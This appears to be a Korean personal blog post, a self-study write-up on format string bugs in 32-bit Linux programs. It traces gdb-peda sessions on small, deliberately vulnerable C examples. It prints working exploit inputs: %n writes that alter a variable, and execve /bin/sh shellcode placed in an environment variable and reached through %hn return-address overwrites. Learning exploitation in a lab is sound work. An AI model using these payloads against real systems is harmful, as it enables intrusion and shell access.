---
layout: article
title: "[System]System hacking Start"
key: 19700101
tags:
  - Pwnable
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] Format String Bug(FSB)

<!--more-->

본격적인 시스템 해킹 공부를 시작한다. 리버싱과도 연관이 있으므로 매우 유익한 듯 하다.
첫번째 주제로 FSB를 선택했다. 

## [+] Concept

아래와 같이 `printf` 와 같은 함수에 사용되는 인자를 변수를 직접적으로 지정하여 사용했을 때, 포맷 스트링을 입력하여 메모리 주소를 누출(leak) 시키거나, 프로그램의 흐름을 제어할 수 있는 취약점을 말한다.

```c++
fgets(buf,sizeof(buf),stdin);
printf(buf);
```

## [+] Example

실제 디버깅을 하며 확인하는게 좋을 듯 하다.

예제 코드는 다음과 같다.

```c++
#include <stdio.h>

int main()
{
    char buf[20];
    fgets(buf,sizeof(buf),stdin);
	printf(buf);
}
```

```
root@shh0ya-Linux:~/pwn# gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie exam.c -o exam
```

```
root@shh0ya-Linux:~/pwn# peda ./exam
Reading symbols from ./exam...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x14
   0x08048471 <+6>:	mov    eax,ds:0x804a020
   0x08048476 <+11>:	push   eax
   0x08048477 <+12>:	push   0x14
   0x08048479 <+14>:	lea    eax,[ebp-0x14]
   0x0804847c <+17>:	push   eax
   0x0804847d <+18>:	call   0x8048340 <fgets@plt>
   0x08048482 <+23>:	add    esp,0xc
   0x08048485 <+26>:	lea    eax,[ebp-0x14]
   0x08048488 <+29>:	push   eax
   0x08048489 <+30>:	call   0x8048330 <printf@plt>
   0x0804848e <+35>:	add    esp,0x4
   0x08048491 <+38>:	mov    eax,0x0
   0x08048496 <+43>:	leave  
   0x08048497 <+44>:	ret    
End of assembler dump.
```

`fgets` 함수에 브레이크 포인트를 설치하고, 함수 내부로 진입했을 때의 스택을 확인해본다.

```
Breakpoint 1, 0x0804847d in main ()
gdb-peda$ si

[----------------------------------registers-----------------------------------]
EAX: 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
EBX: 0x0 
ECX: 0x96dd10cc 
EDX: 0xffffd614 --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd5c4 --> 0x8048482 (<main+23>:	add    esp,0xc)
EIP: 0x8048340 (<fgets@plt>:	jmp    DWORD PTR ds:0x804a010)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048330 <printf@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048336 <printf@plt+6>:	push   0x0
   0x804833b <printf@plt+11>:	jmp    0x8048320
=> 0x8048340 <fgets@plt>:	jmp    DWORD PTR ds:0x804a010
 | 0x8048346 <fgets@plt+6>:	push   0x8
 | 0x804834b <fgets@plt+11>:	jmp    0x8048320
 | 0x8048350 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a014
 | 0x8048356 <__libc_start_main@plt+6>:	push   0x10
 |->   0x8048346 <fgets@plt+6>:	push   0x8
       0x804834b <fgets@plt+11>:	jmp    0x8048320
       0x8048350 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a014
       0x8048356 <__libc_start_main@plt+6>:	push   0x10
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c4 --> 0x8048482 (<main+23>:	add    esp,0xc)
0004| 0xffffd5c8 --> 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
0008| 0xffffd5cc --> 0x14 
0012| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2088 
0016| 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
0020| 0xffffd5d8 --> 0x80484a9 (<__libc_csu_init+9>:	add    ebx,0x1b57)
0024| 0xffffd5dc --> 0x0 
0028| 0xffffd5e0 --> 0xf7fb3000 --> 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048340 in fgets@plt ()

gdb-peda$ x/16x $esp
0xffffd5c4:	0x08048482	0xffffd5d4	0x00000014	0xf7fb35a0
0xffffd5d4:	0x08048210	0x080484a9	0x00000000	0xf7fb3000
0xffffd5e4:	0xf7fb3000	0x00000000	0xf7e19637	0x00000001
0xffffd5f4:	0xffffd684	0xffffd68c	0x00000000	0x00000000
```

스택부분을 확인하면 다음과 같이 `RET | buf | size(20) | stdin` 으로 `ESP+C` 까지 구성되어 있다.

`buf` 의 주소를 보면 `ESP+10` 인 것을 확인할 수 있다. 즉 해당 위치에 입력한 값이 출력 될 것이다. 정상적인 입력을 하고 스택을 보고 확인한다.

```
gdb-peda$ c
Continuing.
AAAA

[----------------------------------registers-----------------------------------]
EAX: 0xffffd5d4 ("AAAA\n")
EBX: 0x0 
ECX: 0x0 
EDX: 0xf7fb487c --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd5c8 --> 0xffffd5d4 ("AAAA\n")
EIP: 0x8048482 (<main+23>:	add    esp,0xc)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048479 <main+14>:	lea    eax,[ebp-0x14]
   0x804847c <main+17>:	push   eax
   0x804847d <main+18>:	call   0x8048340 <fgets@plt>
=> 0x8048482 <main+23>:	add    esp,0xc
   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
   0x8048488 <main+29>:	push   eax
   0x8048489 <main+30>:	call   0x8048330 <printf@plt>
   0x804848e <main+35>:	add    esp,0x4
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c8 --> 0xffffd5d4 ("AAAA\n")
0004| 0xffffd5cc --> 0x14 
0008| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2288 
0012| 0xffffd5d4 ("AAAA\n")
0016| 0xffffd5d8 --> 0x804000a 
0020| 0xffffd5dc --> 0x0 
0024| 0xffffd5e0 --> 0xf7fb3000 --> 0x1b1db0 
0028| 0xffffd5e4 --> 0xf7fb3000 --> 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048482 in main ()
gdb-peda$ x/16x $esp
0xffffd5c8:	0xffffd5d4	0x00000014	0xf7fb35a0	0x41414141
0xffffd5d8:	0x0804000a	0x00000000	0xf7fb3000	0xf7fb3000
0xffffd5e8:	0x00000000	0xf7e19637	0x00000001	0xffffd684
0xffffd5f8:	0xffffd68c	0x00000000	0x00000000	0x00000000
```

함수를 빠져 나오므로 위와 같은 스택으로 구성되며 위에서 예상한대로 스택이 구성되었다.
자 다시 실행해서 이번에는 20바이트를 꽉채워서 스택을 확인해보자.

```
gdb-peda$ c
Continuing.
AAAAAAAAAAAAAAAAAAAA

[----------------------------------registers-----------------------------------]
EAX: 0xffffd5d4 ('A' <repeats 19 times>)
EBX: 0x0 
ECX: 0x0 
EDX: 0xf7fb487c --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd5c8 --> 0xffffd5d4 ('A' <repeats 19 times>)
EIP: 0x8048482 (<main+23>:	add    esp,0xc)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048479 <main+14>:	lea    eax,[ebp-0x14]
   0x804847c <main+17>:	push   eax
   0x804847d <main+18>:	call   0x8048340 <fgets@plt>
=> 0x8048482 <main+23>:	add    esp,0xc
   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
   0x8048488 <main+29>:	push   eax
   0x8048489 <main+30>:	call   0x8048330 <printf@plt>
   0x804848e <main+35>:	add    esp,0x4
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c8 --> 0xffffd5d4 ('A' <repeats 19 times>)
0004| 0xffffd5cc --> 0x14 
0008| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2288 
0012| 0xffffd5d4 ('A' <repeats 19 times>)
0016| 0xffffd5d8 ('A' <repeats 15 times>)
0020| 0xffffd5dc ('A' <repeats 11 times>)
0024| 0xffffd5e0 ("AAAAAAA")
0028| 0xffffd5e4 --> 0x414141 ('AAA')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048482 in main ()
gdb-peda$ x/24x $esp
0xffffd5c8:	0xffffd5d4	0x00000014	0xf7fb35a0	0x41414141
0xffffd5d8:	0x41414141	0x41414141	0x41414141	0x00414141
0xffffd5e8:	0x00000000	0xf7e19637	0x00000001	0xffffd684
0xffffd5f8:	0xffffd68c	0x00000000	0x00000000	0x00000000
0xffffd608:	0xf7fb3000	0xf7ffdc04	0xf7ffd000	0x00000000
0xffffd618:	0xf7fb3000	0xf7fb3000	0x00000000	0x8155e276
```

널 문자를 포함하여 정확하게 20바이트만큼 사용한다. 그럼 여기서 포맷 스트링을 입력하여 취약점이 어떻게 발생하는지 확인한다.

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffd5d4 ("AAAA %X %X %X\n")
EBX: 0x0 
ECX: 0x0 
EDX: 0xf7fb487c --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5e8 --> 0x0 
ESP: 0xffffd5d0 --> 0xffffd5d4 ("AAAA %X %X %X\n")
EIP: 0x8048489 (<main+30>:	call   0x8048330 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048482 <main+23>:	add    esp,0xc
   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
   0x8048488 <main+29>:	push   eax
=> 0x8048489 <main+30>:	call   0x8048330 <printf@plt>
   0x804848e <main+35>:	add    esp,0x4
   0x8048491 <main+38>:	mov    eax,0x0
   0x8048496 <main+43>:	leave  
   0x8048497 <main+44>:	ret
Guessed arguments:
arg[0]: 0xffffd5d4 ("AAAA %X %X %X\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffd5d0 --> 0xffffd5d4 ("AAAA %X %X %X\n")
0004| 0xffffd5d4 ("AAAA %X %X %X\n")
0008| 0xffffd5d8 (" %X %X %X\n")
0012| 0xffffd5dc ("%X %X\n")
0016| 0xffffd5e0 --> 0xf7000a58 
0020| 0xffffd5e4 --> 0xf7fb3000 --> 0x1b1db0 
0024| 0xffffd5e8 --> 0x0 
0028| 0xffffd5ec --> 0xf7e19637 (<__libc_start_main+247>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048489 in main ()

gdb-peda$ x/16x $esp
0xffffd5d0:	0xffffd5d4	0x41414141	0x20582520	0x25205825
0xffffd5e0:	0xf7000a58	0xf7fb3000	0x00000000	0xf7e19637
0xffffd5f0:	0x00000001	0xffffd684	0xffffd68c	0x00000000
0xffffd600:	0x00000000	0x00000000	0xf7fb3000	0xf7ffdc04
```

`printf` 호출 직전의 스택이다. 입력 값은 `AAAA %X %X %X` 이며, 스택을 확인하면 개행(`0a`)까지 잘 입력되어 있다.
이대로 출력하면 결과는 다음과 같이 스택에 있는 값들이 출력된다.

```
Breakpoint 3, 0x08048489 in main ()
gdb-peda$ ni
AAAA 41414141 20582520 25205825
```

예상과는 약간 다른 출력 값이 나온다.. 아직 원인은 모르겠다. 이렇다 하더라도 입력 값을 늘려 내가 원하는 값을 조작할 수 있다. 

```c++
#include <stdio.h>

int main()
{
	int num=1234;
	char buf[20];
	printf("addr = %p\n",&num);
	gets(buf);
	printf(buf);
	printf("\n");
	printf("num = %d\n",num);
}
```

간단하게 변수의 주소를 출력하고 이 주소를 이용하여 공격을 시도해본다.

```
root@shh0ya-Linux:~/pwn# clear
root@shh0ya-Linux:~/pwn# (python -c 'print "AAAA\xf4\xd5\xff\xff%1230x%n"';cat)|./exam
addr = 0xffffd5f4
AAAA񗀿                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      41414141
num = 1238
```

1238이 출력되는 이유는 `AAAA+&num(4)` 까지 8바이트가 존재하기 때문이다. 1230 만큼과 8바이트 만큼의 출력 길이가 num 변수에 저장되어 위와 같은 결과를 가져오는 것이다.

## [+] Training 1

```c++
#include <stdio.h>
#include <string.h>
 
int main() {
    char flag[] = "0";
    char buf[20];
    fgets(buf, sizeof(buf), stdin);                          
    printf(buf);
    printf("%p\n",&flag);
    if(!strcmp(flag,"1")) {
        printf("Complete\n");
    }
}

```

```
root@shh0ya-Linux:~/pwn/fsb# gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie exam.c -o exam -w
```

간단한 코드다. 단 `strcmp`를 통해 `flag` 변수의 값이 `"1"`(0x31,49) 가 되어야 `Complete` 라는 문자열이 출력된다.
이 코드로 연습을 해본다.

```
root@shh0ya-Linux:~/pwn/fsb# ./exam
AAAA %x %x
AAAA 414133dc 25204141
ffffd5f6
```

`"AAAA %x %x"` 입력 시 위와 같은 결과를 볼 수 있다. 자 `flag`의 주소를 출력하도록 해놨으므로 해당 주소를 이용하여 변수의 값을 변조해본다.

현재 4바이트의 더미 값을 입력하였더니 두 개의 메모리에서 나누어 출력되었다. 그렇다면 첫 번째 서식에서 출력 된 `414133dc` 에서 `33dc` 는 기존의 어떤 값이고, 해당 값 다음부터가 변수의 시작 주소라고 볼 수 있다.

변조를 하기 위해 2바이트의 더미를 입력하고, `flag` 의 주소를 입력해본다.

```
root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\xf6\xd5\xff\xff %x %x"'; cat)|./exam
AA󗀿 414133dc ffffd5f6
ffffd5f6
```

위와 같이 내가 원하는 위치에 특정 주소를 입력했다. 그러면 이제 `%n` 서식을 이용하여 내가 원하는 값을 해당 주소에 복사하면 된다.

### [-] Point

`printf` 함수는 내부적으로 매우 복잡하게 되어있다. 한 글자씩 가져와 그냥 문자인지, 포맷스트링인지도 확인한다.
이 때 `%` 문자를 만나게 되면 다음 문자를 가져와 `d, x, X, n, s ...` 등인지 확인하고 서식에 맞는 로직을 타게 된다. 

예를 들어, `printf("Shh0ya%n",&num)` 이라는 구문이 있다면, `printf` 호출 직전 스택의 ESP 에는 입력 값 주소(`"Shh0ya%n"`) 이 저장된다. 그리고 두번째 인자인 `&num` 은 ESP+4 위치에 저장된다.

`printf` 는 내부적으로 한 문자씩 가져와 일반 문자인지, 포맷스트링인지 확인한다. `%` 문자라면 바로 다음 문자를 가져와 `d,x,X,s,c,n,p` 등등 인지 확인하고 해당하는 로직을 실행하게 된다. `%n`의 경우 내부적으로 `_get_print_count_ouput` 과 같은 로직이 호출되고 이 때 길이를 확인하고 이 값을 위의 ESP+4 의 주소 안에 복사한다.

자 그럼 다음 내용을 보고 동작을 분석해본다.

```
root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\xf6\xd5\xff\xff%43x%n"'; cat) | ./exam
AA󗀿                                   414133dc
ffffd5f6
Complete
```

보면 `Complete`가 출력됐다. 디버거를 이용해 정확한 동작을 분석한다. `printf` 호출 직전에 브레이크 포인트를 설치하고 위와 같은 입력 값으로 실행하고 스택을 본다.

```
gdb-peda$ r < <(python -c 'print "AA\xd6\xd5\xff\xff%43x%n"')
Starting program: /root/pwn/fsb/exam < <(python -c 'print "AA\xd6\xd5\xff\xff%43x%n"')

[----------------------------------registers-----------------------------------]
EAX: 0xffffd5c2 --> 0xd5d64141 
EBX: 0x0 
ECX: 0x0 
EDX: 0xf7fb487c --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5d8 --> 0x0 
ESP: 0xffffd5bc --> 0xffffd5c2 --> 0xd5d64141 
EIP: 0x80484ef (<main+36>:	call   0x8048380 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484e8 <main+29>:	add    esp,0xc
   0x80484eb <main+32>:	lea    eax,[ebp-0x16]
   0x80484ee <main+35>:	push   eax
=> 0x80484ef <main+36>:	call   0x8048380 <printf@plt>
   0x80484f4 <main+41>:	add    esp,0x4
   0x80484f7 <main+44>:	lea    eax,[ebp-0x2]
   0x80484fa <main+47>:	push   eax
   0x80484fb <main+48>:	push   0x80485c0
Guessed arguments:
arg[0]: 0xffffd5c2 --> 0xd5d64141 
[------------------------------------stack-------------------------------------]
0000| 0xffffd5bc --> 0xffffd5c2 --> 0xd5d64141 
0004| 0xffffd5c0 --> 0x414133dc 
0008| 0xffffd5c4 --> 0xffffd5d6 --> 0x30 ('0')
0012| 0xffffd5c8 ("%43x%n\n")
0016| 0xffffd5cc --> 0xa6e25 ('%n\n')
0020| 0xffffd5d0 --> 0xf7fb3000 --> 0x1b1db0 
0024| 0xffffd5d4 --> 0x303000 ('')
0028| 0xffffd5d8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484ef in main ()

```

```
gdb-peda$ x/16x $esp
0xffffd5bc:	0xffffd5c2	0x414133dc	0xffffd5d6	0x78333425
0xffffd5cc:	0x000a6e25	0xf7fb3000	0x00303000	0x00000000
0xffffd5dc:	0xf7e19637	0x00000001	0xffffd674	0xffffd67c
0xffffd5ec:	0x00000000	0x00000000	0x00000000	0xf7fb3000
```

ESP에는 문자열의 주소가 저장되어 있다. ESP+6의 위치부터 버퍼가 시작되는 것을 확인할 수 있다.
이 때, ESP+8의 위치에는 변조해야 하는 `flag`의 주소 값이 저장되었다. 

디버거에서 확인 시, `flag` 주소 값의 0x20 만큼 차이가 나는 것을 확인할 수 있다.

자 이제 `printf` 함수의 입장에서 본다.
ESP+6부터 한 글자씩 읽어온다. `0x41 0x41 0xd6 0xd5 0xff 0x ff 0xff ..` 그러다 ESP+C의 위치에 `0x25("%")` 를 만나게 되고 다음 문자를 읽어 어떤 동작을 할지 결정한다.

그러나 `0x34, 0x33`으로 해당하는 문자가 없으므로 그 다음 문자인 `0x78("x")` 를 읽고, 이에 맞는 동작을 수행한다.
ESP+4 의 값을 포맷스트링에 대응하는 주소로 생각하고 43바이트의 Hex 형태로 출력을 해준다. 그리고 다시 문자를 읽는데 다시 "%"를 만나게 된다. 바로 다음 문자는 `0x6e("n")` 으로 위에서 출력한 길이를 계산한다. 

```
AA = 2 bytes
dummy(%43x) = 43 bytes
414133dc(%x) = 4 bytes

AA+dummy+414133dc = 49 bytes
```

위와 같은 길이가 계산된다. 두 번째 포맷 스트링이기 때문에 ESP+8 위치의 값 안에 이 값이 저장되게 된다.
현재 ESP+8 의 위치에는 `flag` 변수의 주소 값이 담겨있다. 

그렇기 때문에 `49(0x31)` 으로 변조되어 내가 원하는 흐름으로 제어가 가능한 것이다.

## [+] Training 2

자 그러면 이번에는 포맷 스트링을 이용하여 쉘을 획득하는 방법에 대해 연습해본다.

먼저 RET를 공략해보자.

입력 값이 길어지기 때문에 예제 소스코드를 다음처럼 변경하였다.

```c++
#include <stdio.h>
#include <string.h>
 
int main() {
    char flag[] = "0";
    char buf[1024];
    fgets(buf, sizeof(buf), stdin);                          
    printf(buf);
    printf("%p\n",&flag);
    if(!strcmp(flag,"1")) {
        printf("Complete\n");
    }
}
```

```
root@shh0ya-virtual-machine:~/Pwn/FSB# export EGG=`python -c 'print "\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

쉘 코드를 환경변수에 등록했고, 아래와 같이 환경변수의 주소를 구했다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# ./a.out 
addr->0xffffd81e
```

메인함수에 bp를 설치하고 RET 주소를 확인하면 다음과 같다.

```
[----------------------------------registers-----------------------------------]
EAX: 0xf7fb7dbc --> 0xffffd61c --> 0xffffd782 ("LC_PAPER=ko_KR.UTF-8")
EBX: 0x0 
ECX: 0xf36c5113 
EDX: 0xffffd5a4 --> 0x0 
ESI: 0xf7fb6000 --> 0x1b1db0 
EDI: 0xf7fb6000 --> 0x1b1db0 
EBP: 0x0 
ESP: 0xffffd57c --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
EIP: 0x80484cb (<main>:	push   ebp)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484c2 <frame_dummy+34>:	add    esp,0x10
   0x80484c5 <frame_dummy+37>:	leave  
   0x80484c6 <frame_dummy+38>:	jmp    0x8048440 <register_tm_clones>
=> 0x80484cb <main>:	push   ebp
   0x80484cc <main+1>:	mov    ebp,esp
   0x80484ce <main+3>:	sub    esp,0x404
   0x80484d4 <main+9>:	mov    WORD PTR [ebp-0x2],0x30
   0x80484da <main+15>:	mov    eax,ds:0x804a040
[------------------------------------stack-------------------------------------]
0000| 0xffffd57c --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
0004| 0xffffd580 --> 0x1 
0008| 0xffffd584 --> 0xffffd614 --> 0xffffd76f ("/root/Pwn/FSB/exam")
0012| 0xffffd588 --> 0xffffd61c --> 0xffffd782 ("LC_PAPER=ko_KR.UTF-8")
0016| 0xffffd58c --> 0x0 
0020| 0xffffd590 --> 0x0 
0024| 0xffffd594 --> 0x0 
0028| 0xffffd598 --> 0xf7fb6000 --> 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484cb in main ()
```

RET 주소는 `0xffffd57c` 로 확인된다. 환경변수의 주소도 알고 있고, 입력 버프의 길이도 알고 있으므로 이제 공격을 시도하면 된다. 그러나 한가지 문제가 존재한다.

디버거와 실제 실행 시 메모리 주소가 다르다는 점이다.

```
gdb-peda$ r
Starting program: /root/Pwn/FSB/exam 
AA
AA
0xffffd576
```

디버거로 실행했을 때 `flag` 변수의 주소가 `0xffffd576`으로 출력된다. 그러나 쉘에서 그냥 실행하게 되면 다음과 같이 다른 메모리 주소를 확인할 수 있다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# ./exam
AA
AA
0xffffd5a6
```

0x30만큼의 차이가 나는 것을 확인할 수 있다. 이는 gdb에서 사용하는 환경변수들이 존재하기 때문에 메모리 주소가 차이나는 것이다.

결론적으로 쉘에서의 실행 결과와 같은 메모리의 주소를 확인하고 싶다면 gdb에서 내부적으로 사용하는 환경변수를 없애면 된다. 사용하는 환경변수를 확인하려면 다음과 같이 확인할 수 있다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# env -i gdb -q ./exam
Reading symbols from ./exam...(no debugging symbols found)...done.
(gdb) show env
LINES=37
COLUMNS=136
```

`LINES`와 `COLUMNS` 라는 환경변수를 사용하는 것으로 보인다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# ./exam
AA
AA
0xffffd5a6	<= 쉘에서의 실행

root@shh0ya-virtual-machine:~/Pwn/FSB# peda ./exam
Reading symbols from ./exam...(no debugging symbols found)...done.
gdb-peda$ unset env LINES
gdb-peda$ unset env COLUMNS
gdb-peda$ r
Starting program: /root/Pwn/FSB/exam 
AA
AA
0xffffd5a6	<= 환경변수를 제거함으로써 동일한 주소 획득
```

자 위와 같은 결과로 다시 RET를 확인해본다.

```
gdb-peda$ r
Starting program: /root/Pwn/FSB/exam 

[----------------------------------registers-----------------------------------]
EAX: 0xf7fb7dbc --> 0xffffd64c --> 0xffffd797 ("LC_PAPER=ko_KR.UTF-8")
EBX: 0x0 
ECX: 0x608bc5c4 
EDX: 0xffffd5d4 --> 0x0 
ESI: 0xf7fb6000 --> 0x1b1db0 
EDI: 0xf7fb6000 --> 0x1b1db0 
EBP: 0x0 
ESP: 0xffffd5ac --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
EIP: 0x80484cb (<main>:	push   ebp)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484c2 <frame_dummy+34>:	add    esp,0x10
   0x80484c5 <frame_dummy+37>:	leave  
   0x80484c6 <frame_dummy+38>:	jmp    0x8048440 <register_tm_clones>
=> 0x80484cb <main>:	push   ebp
   0x80484cc <main+1>:	mov    ebp,esp
   0x80484ce <main+3>:	sub    esp,0x404
   0x80484d4 <main+9>:	mov    WORD PTR [ebp-0x2],0x30
   0x80484da <main+15>:	mov    eax,ds:0x804a040
[------------------------------------stack-------------------------------------]
0000| 0xffffd5ac --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
0004| 0xffffd5b0 --> 0x1 
0008| 0xffffd5b4 --> 0xffffd644 --> 0xffffd784 ("/root/Pwn/FSB/exam")
0012| 0xffffd5b8 --> 0xffffd64c --> 0xffffd797 ("LC_PAPER=ko_KR.UTF-8")
0016| 0xffffd5bc --> 0x0 
0020| 0xffffd5c0 --> 0x0 
0024| 0xffffd5c4 --> 0x0 
0028| 0xffffd5c8 --> 0xf7fb6000 --> 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484cb in main ()
```

`0xffffd5ac` 로 되어있는데 위에서 구한 `0xffffd57c`와 정확히 0x30 차이가 난다.
공격 코드를 짜본다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# (python -c 'print "AA"+"\xac\xd5\xff\xff"+"AAAA"+"\xae\xd5\xff\xff"+"%55312x%hn%10209x%hn"';cat)|./exam
AA¬ֿÿAAAA®ֿÿ <공백> 4141e550 <공백> 41414141
0xffffd5a6

ls
a.out  env.c  exam  exam.c  peda-session-dash.txt  peda-session-exam.txt
pwd
/root/Pwn/FSB
```

위와 같이 공격에 성공하여 쉘을 실행한 것을 볼 수 있다.

```
Dummy(AA) 2 bytes
RET 하위주소(0xffffd5ac) 4 bytes
Dummy(AAAA) 4 bytes
RET 상위주소(0xffffd5ae) 4 bytes
쉘 코드 하위주소(0xD810) 55312 bytes
쉘 코드 상위주소(0x27E1) 10209 bytes
```

`printf` 호출 직전 다음과 같은 스택이 구성된다.

```
gdb-peda$ x/16wx $esp
0xffffd170:	0xffffd176	0x4141e550	0xffffd5ac	0x41414141
0xffffd180:	0xffffd5ae	0x33353525	0x25783231	0x31256e68
0xffffd190:	0x39303230	0x6e682578	0x0000000a	0x00000000
0xffffd1a0:	0x00000000	0x00000000	0x00000000	0x00000006
```

총 4개의 포맷스트링이 존재한다. (`%x %hn %x %hn`)
첫 번째 %x를 만나면 55308 바이트만큼 공백을 출력하고 4바이트의 ESP+4 의 값을 출력한다.(55312)
두 번째 %hn을 만나면 현재까지 출력한 길이를 ESP+8 위치에 있는 주소 안에 WORD 사이즈에 복사한다.

즉 0xffffd5ac(RET)부터 2바이트에 Dummy(2) + RET 하위(4) + Dummy(4) + RET 상위(4) + 55312 값을 저장하게 된다. 이 값은 0xD812(55326) 으로 쉘코드의 하위 주소에 해당된다. 

세번째 %x를 만나면 위와 같이 10205바이트만큼 공백 출력 후,  ESP+C 위치에 값을 4바이트 출력한다.(10209)
네번째 %hn을 만나면 현재까지 출력한 길이를 ESP+10 위치에 있는 주소 안에 WORD 사이즈 복사한다.

0xffffd5ae(RET+2)부터 2바이트까지 출력된 모든 길이를 저장하게 된다. 모두 더하면 65535 로 0xFFFF가 된다. 

```
gdb-peda$ x/16wx 0xffffd5ac
0xffffd5ac:	0xffffd81e	0x00000001	0xffffd644	0xffffd64c
0xffffd5bc:	0x00000000	0x00000000	0x00000000	0xf7fb6000
0xffffd5cc:	0xf7ffdc04	0xf7ffd000	0x00000000	0xf7fb6000
0xffffd5dc:	0xf7fb6000	0x00000000	0x19d758f0	0x25f7d6e0
```

위와 같이 RET의 값이 환경변수에 저장해두었던 쉘 코드의 주소로 변조된 것을 확인할 수 있다.

## [+] Training 3

이번엔 `printf` 함수의 RET를 변조하는 연습을 해보자.

`printf` 함수 호출 직후, 스택은 아래와 같다.

```
gdb-peda$ x/16x $esp
0xffffd16c:	0x08048500	0xffffd176	0x4141e550	0x0016000a
0xffffd17c:	0x0016508c	0x0016508c	0x0000619c	0x0000619c
0xffffd18c:	0x00000004	0x00000004	0x6474e551	0x00000000
0xffffd19c:	0x00000000	0x00000000	0x00000000	0x00000000
```

ESP에는 RET 주소가 담겨있고, ESP+4에 버퍼 주소가 담겨있는 것을 확인할 수 있다.
현재 ESP 주소의 값을 환경변수 `EGG` 의 주소로 변조해주면 될 것이다.

마찬가지로 주소의 오차가 있을 수 있으므로 `unset LINES, COLUMNS` 명령으로 환경변수를 지워주고 메모리 주소를 다시 확인한다.

```
gdb-peda$ x/16x $esp
0xffffd19c:	0x08048500	0xffffd1a6	0x4141e550	0x0016000a
0xffffd1ac:	0x0016508c	0x0016508c	0x0000619c	0x0000619c
0xffffd1bc:	0x00000004	0x00000004	0x6474e551	0x00000000
0xffffd1cc:	0x00000000	0x00000000	0x00000000	0x00000000
```

RET 주소는 0xffffd19c 로 확인된다. 환경변수의 주소는 0xffffd81e 이다.

```
root@shh0ya-virtual-machine:~/Pwn/FSB# (python -c 'print "AA\x9c\xd1\xff\xff"+"AAAA\x9e\xd1\xff\xff"+"%55312x%hn"+"%10209x%hn"'; cat)|./exam

...
                                                                                                           41414141

ls
a.out  env.c  exam  exam.c  peda-session-dash.txt  peda-session-exam.txt

pwd
/root/Pwn/FSB
```

